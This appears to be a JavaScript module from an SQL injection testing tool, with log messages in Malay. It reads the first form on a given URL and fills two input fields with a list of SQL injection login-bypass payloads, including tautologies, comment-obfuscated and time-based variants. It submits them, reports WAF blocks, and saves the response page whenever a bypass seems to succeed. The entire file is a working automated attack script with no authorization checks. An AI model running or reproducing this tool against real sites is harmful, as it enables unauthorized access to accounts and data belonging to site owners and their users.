// 📁 sqli-electron-gui/sqli.js
const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');
const fs = require('fs');
const path = require('path');

const payloads = [
  "' or 1=1--",
  "' or '1'='1",
  "' OR 'a'='a",
  "' OR 1=1#",
  "' OR 1=1/*",
  "'/**/OR/**/1=1--",
  "'+OR+1=1--",
  "' OR SLEEP(1)--"
];

async function handleSQLiTest(url) {
  const log = [];
  try {
    const res = await axios.get(url, { timeout: 10000 });
    const $ = cheerio.load(res.data);

    const form = $('form').first();
    const inputs = form.find('input');
    const action = form.attr('action') || url;
    const method = (form.attr('method') || 'post').toLowerCase();

    const allFields = {};
    const textFields = [];

    inputs.each((i, el) => {
      const type = ($(el).attr('type') || 'text').toLowerCase();
      const name = $(el).attr('name');
      const value = $(el).attr('value') || '';
      if (!name) return;

      if (["hidden", "submit", "button", "checkbox"].includes(type)) {
        allFields[name] = value || '1';
      } else {
        allFields[name] = value;
        textFields.push(name);
      }
    });

    if (textFields.length < 2) {
      log.push('❌ Tak cukup input login (kurang dari 2).');
      return log;
    }

    const [param1, param2] = textFields;
    const targetUrl = action.startsWith('http') ? action : new URL(action, url).href;
    log.push(`📥 Dikesan input: ${param1}, ${param2}`);

    for (let payload of payloads) {
      const data = { ...allFields };
      data[param1] = payload;
      data[param2] = payload;

      log.push(`\n🚀 Uji payload: ${payload}`);

      try {
        const postRes = await axios({
          method,
          url: targetUrl,
          data: qs.stringify(data),
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          timeout: 10000,
          validateStatus: () => true
        });

        const status = postRes.status;
        const html = postRes.data;

        if (status === 403 || html.includes("Firewall") || html.includes("Access Denied")) {
          log.push(`🛡️ Dihalang oleh WAF atau status ${status}`);
        } else if (!html.includes('invalid') && !html.includes('error') && status < 400) {
          log.push(`✅ BERJAYA LOGIN dengan payload: ${payload}`);

          // Simpan snapshot
          const folder = path.join(__dirname, 'output');
          if (!fs.existsSync(folder)) fs.mkdirSync(folder);

          const filename = `success-${payload.replace(/[^a-z0-9]/gi, '_')}.html`;
          const filepath = path.join(folder, filename);
          fs.writeFileSync(filepath, html, 'utf-8');
          log.push(`📸 Snapshot disimpan ke: output/${filename}`);
          break;
        } else {
          log.push(`❌ Gagal login.`);
        }
      } catch (err) {
        log.push(`⚠️ Error: ${err.message}`);
      }
    }
  } catch (err) {
    log.push(`❌ Tak dapat akses halaman: ${err.message}`);
  }

  return log;
}

module.exports = { handleSQLiTest };
